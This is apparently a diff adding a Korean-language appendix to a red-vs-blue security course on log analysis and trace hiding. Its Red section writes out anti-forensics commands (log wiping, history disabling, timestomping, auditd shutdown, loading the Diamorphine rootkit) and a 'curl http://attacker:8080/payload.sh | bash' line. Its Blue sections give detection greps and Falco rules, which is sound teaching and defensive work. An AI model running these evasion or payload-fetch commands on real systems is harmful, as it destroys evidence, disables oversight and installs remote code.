@@ -473,3 +473,254 @@ graph LR
 
 **학생 액션**: dataset 100건을 ELK 에 ingest → query 실험.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 08 로그 분석 + 흔적 은닉)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 | 명령 |
+|------|----------|---------|------|
+| s1 | Wazuh alert 통합 | Wazuh manager + jq | `jq 'select(.rule.level >= 10)' alerts.json` |
+| s2 | lnav (컬러 + SQL) | lnav | `lnav /var/log/auth.log` |
+| s3 | Sigma + chainsaw | chainsaw + Sigma rules | `chainsaw hunt /var/log -s sigma/rules/` |
+| s4 | hayabusa (Win EVTX) | hayabusa | `hayabusa csv-timeline -d /evtx` |
+| s5 | Velociraptor | velociraptor | `velociraptor flow create EvidenceOfCompromise` |
+| s6 | Bash history 검사 | grep + ausearch | `grep -E "wget|curl|nc " ~/.bash_history` |
+| s7 | 흔적 은닉 (Red) | shred / chattr / timestomp | `shred -uvz /var/log/auth.log` |
+| s8 | 자동 분석 (LLM) | langchain + Wazuh API | LLM 자동 alert 분류 |
+
+### Blue 환경 준비
+
+```bash
+ssh ccc@10.20.30.100
+sudo apt install -y lnav multitail jq
+cargo install chainsaw                                     # Rust
+
+git clone https://github.com/Yamato-Security/hayabusa ~/hayabusa
+cd ~/hayabusa && cargo build --release
+
+# Velociraptor
+curl -L https://github.com/Velocidex/velociraptor/releases/latest/download/velociraptor-v0.7.0-linux-amd64 -o /tmp/vr
+chmod +x /tmp/vr && sudo mv /tmp/vr /usr/local/bin/velociraptor
+
+# Sigma rules (5000+ rule)
+git clone https://github.com/SigmaHQ/sigma ~/sigma
+```
+
+### Blue — 5 단계 로그 분석
+
+```bash
+# === Phase 1: 실시간 alert 모니터 ===
+sudo jq 'select(.rule.level >= 10)' /var/ossec/logs/alerts/alerts.json
+# 또는 watch 으로 실시간:
+watch -n 5 'sudo jq -r "select(.rule.level >= 10) | \"\(.timestamp) [\(.rule.level)] \(.rule.description)\"" /var/ossec/logs/alerts/alerts.json | tail -10'
+
+# === Phase 2: lnav (컬러 + SQL 형 검색) ===
+sudo lnav /var/log/auth.log /var/log/syslog
+# lnav 안에서:
+# :filter-in error
+# :filter-out cron
+# ;SELECT * FROM auth_log WHERE log_level = 'error'
+
+# === Phase 3: Sigma + chainsaw (가설 헌팅) ===
+chainsaw hunt /var/log -s ~/sigma/rules/linux/ \
+    --output json > /tmp/hunt.json
+
+# 결과 분석
+jq -r '.[] | "\(.timestamp) [\(.rule.title)] \(.rule.severity)"' /tmp/hunt.json | head
+
+# === Phase 4: Win EVTX (있으면) ===
+~/hayabusa/target/release/hayabusa csv-timeline \
+    -d /evtx_files \
+    -o /tmp/timeline.csv
+
+# 통계
+~/hayabusa/target/release/hayabusa logon-summary -d /evtx_files
+
+# === Phase 5: Velociraptor (multi-host live hunt) ===
+velociraptor query "
+SELECT pid, name, exe, cmdline, username
+FROM artifact(name='Linux.Sys.Process')
+WHERE exe LIKE '%/tmp/%' OR exe LIKE '%/dev/shm/%'
+"
+
+# === Phase 6: Bash history 검사 ===
+sudo cat /home/*/.bash_history /root/.bash_history 2>/dev/null | \
+    grep -E "wget|curl|nc |bash -i|/dev/tcp|chmod \+s|chattr" | head
+```
+
+### Red — 흔적 은닉 (학생 양면 학습)
+
+```bash
+# === 1. 현재 세션 history 끄기 ===
+unset HISTFILE
+export HISTSIZE=0
+history -c
+
+# 또는 ;공백으로 시작하면 history 안 남음 (HISTCONTROL=ignorespace)
+ sudo wget http://attacker/payload     # 공백 시작 (안 보임)
+
+# === 2. 로그 wipe ===
+# 가장 단순
+sudo > /var/log/auth.log
+sudo > /var/log/wtmp
+
+# 더 안전 (덮어쓰기 + 삭제)
+sudo shred -uvz /var/log/auth.log
+
+# 특정 user 만
+sudo journalctl --vacuum-files=0 --user=ccc
+
+# === 3. Timestamp 변조 ===
+touch -t 202001010000 /tmp/payload                         # 시간 위조
+
+# stat 으로 확인
+stat /tmp/payload                                          # Modify: 2020-01-01
+
+# === 4. 파일 immutable (rm 도 안 됨) ===
+sudo chattr +i /tmp/payload
+ls -la /tmp/payload                                         # 권한 + 'i' attribute
+sudo lsattr /tmp/payload                                    # i 표시
+
+# === 5. Audit 비활성 (root 권한) ===
+sudo auditctl -e 0                                          # auditing 끄기
+sudo systemctl stop auditd
+
+# === 6. Kernel module 으로 process 숨김 (rootkit) ===
+# 학습 참고만 — 실제 운영 환경 사용 금지
+git clone https://github.com/m0nad/Diamorphine ~/diamorphine
+cd ~/diamorphine && make
+sudo insmod diamorphine.ko
+# Process 가 ps 에서 안 보임 — 매우 위험
+
+# === 7. 분산 (LOTL — Living Off The Land) ===
+# /usr/bin/curl 은 모든 시스템에 있음 — AV 차단 안 함
+sudo curl http://attacker:8080/payload.sh | bash
+```
+
+### Blue — 흔적 은닉 탐지 (Red 우회 대응)
+
+```bash
+# === 1. AIDE FIM (변경 감지) ===
+sudo apt install -y aide
+sudo aideinit
+sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
+
+# 매일 cron:
+echo "0 2 * * * sudo aide --check | mail -s 'AIDE report' admin@x.com" | sudo tee -a /etc/crontab
+
+# 변경 발견 시 자동 alert
+sudo aide --check 2>&1 | grep -E "Added|Changed|Removed"
+
+# === 2. Wazuh FIM (실시간) ===
+# /var/ossec/etc/ossec.conf 에 syscheck 활성
+# <syscheck>
+#   <directories check_all="yes" realtime="yes">/etc</directories>
+#   <directories check_all="yes" realtime="yes">/usr/bin</directories>
+# </syscheck>
+sudo systemctl restart wazuh-agent
+
+# === 3. auditd (audit 비활성화 시도 자동 탐지) ===
+sudo tee /etc/audit/rules.d/audit-protect.rules << 'EOF'
+# auditd 변경 차단
+-w /etc/audit/ -p wa -k auditconfig
+-w /etc/libaudit.conf -p wa -k auditconfig
+
+# Final lock — 부팅 후 수정 불가
+-e 2
+EOF
+
+# === 4. Falco rule (history clear 탐지) ===
+sudo tee /etc/falco/falco_rules.local.yaml << 'EOF'
+- rule: Bash History Cleared
+  desc: history -c 또는 .bash_history 삭제
+  condition: >
+    (proc.name = bash and proc.cmdline contains "history -c") or
+    (proc.name = rm and fd.name endswith "bash_history")
+  output: "Bash history cleared (user=%user.name cmd=%proc.cmdline)"
+  priority: WARNING
+
+- rule: Log File Wiped
+  desc: 로그 파일 zero-out
+  condition: >
+    open_write and 
+    fd.directory startswith "/var/log" and
+    proc.cmdline matches "(>|truncate|shred)"
+  output: "Log wiped (user=%user.name file=%fd.name)"
+  priority: ERROR
+
+- rule: Auditd Disabled
+  desc: auditd 비활성 시도
+  condition: spawned_process and proc.cmdline contains "auditctl -e 0"
+  output: "Auditd disabled (user=%user.name)"
+  priority: CRITICAL
+
+- rule: Suspicious chattr +i
+  desc: 파일 immutable 설정
+  condition: spawned_process and proc.name = chattr and proc.cmdline contains "+i"
+  output: "Immutable attribute set (file=%proc.cmdline)"
+  priority: WARNING
+EOF
+sudo systemctl restart falco
+
+# === 5. 통합 (Wazuh + Falco + Velociraptor) ===
+# Velociraptor 가 모든 호스트에서 실시간 evidence 수집
+velociraptor flow create EvidenceOfCompromise --hostnames all
+```
+
+### 통합 hunt 스크립트 (자동)
+
+```bash
+#!/bin/bash
+# /usr/local/bin/auto-hunt.sh
+# 매시간 실행
+
+DIR=/var/log/auto-hunt/$(date +%Y%m%d-%H)
+mkdir -p $DIR
+
+# 1) Sigma + chainsaw
+chainsaw hunt /var/log -s ~/sigma/rules/linux/ --output json > $DIR/01-chainsaw.json
+
+# 2) Falco 24h alerts
+sudo journalctl -u falco --since "1 hour ago" --output json > $DIR/02-falco.json
+
+# 3) AIDE check
+sudo aide --check > $DIR/03-aide.txt 2>&1
+
+# 4) Bash history (모든 user)
+sudo cat /home/*/.bash_history /root/.bash_history 2>/dev/null > $DIR/04-history.txt
+
+# 5) auditd 변경 사항
+sudo aureport --auth -i --start hour-1 > $DIR/05-auth.txt
+sudo aureport --user -i --start hour-1 > $DIR/06-user.txt
+
+# 6) Velociraptor live
+velociraptor query "SELECT * FROM glob(globs='/etc/cron*')" --format json > $DIR/07-cron.json
+
+# 7) LLM 자동 분류 (langchain)
+python3 /opt/scripts/auto_classify.py --dir $DIR --output $DIR/00-summary.md
+
+# 8) 통합 alert (level >= 10 인 결과만 Slack)
+ALERTS=$(jq -r '.[] | select(.severity == "CRITICAL" or .severity == "HIGH")' \
+    $DIR/01-chainsaw.json $DIR/02-falco.json | jq -s '.')
+if [ "$(echo $ALERTS | jq '. | length')" -gt 0 ]; then
+    curl -X POST $SLACK_WEBHOOK -H 'Content-Type: application/json' \
+        -d "{\"text\": \"⚠ Hourly hunt alerts: $(echo $ALERTS | jq '. | length')\", \"attachments\": [{\"text\": \"$ALERTS\"}]}"
+fi
+```
+
+### Red vs Blue 점수
+
+| Red 행동 | 점수 | Blue 탐지 | 점수 |
+|---------|------|----------|------|
+| history 삭제 | +5 | Falco bash history rule | +10 |
+| 로그 wipe | +10 | Wazuh FIM /var/log | +15 |
+| chattr +i | +5 | Falco chattr rule | +5 |
+| timestomp | +5 | AIDE 변경 감지 | +10 |
+| auditd 비활성 | +15 | Falco auditd rule | +15 |
+| LOTL (curl) | +10 | Suricata egress + DLP | +10 |
+| Rootkit | +30 | (탐지 어려움) chkrootkit + osquery | +20 |
+
+학생은 본 8주차에서 **Blue (Wazuh + jq + lnav + chainsaw + Velociraptor + AIDE + Falco) ↔ Red (shred + chattr + timestomp + LOTL + auditd 비활성)** 의 흔적 공방을 OSS 도구로 익힌다.
